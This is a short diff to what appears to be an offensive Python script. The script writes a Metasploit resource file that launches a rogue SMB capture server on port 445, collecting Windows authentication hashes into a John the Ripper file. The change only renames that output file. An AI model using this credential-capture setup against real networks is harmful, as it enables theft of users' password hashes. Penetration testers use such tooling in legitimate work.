@@ -19,7 +19,7 @@ def msfListener(ipAttacker):
 use auxiliary/server/capture/smb
 set SRVHOST <SERVER>
 set SRVPORT 445
-set JOHNPWFILE passwords
+set JOHNPWFILE hashescaptured
 run
 '''.replace('<SERVER>',ipAttacker))
 	resourceFile.close()
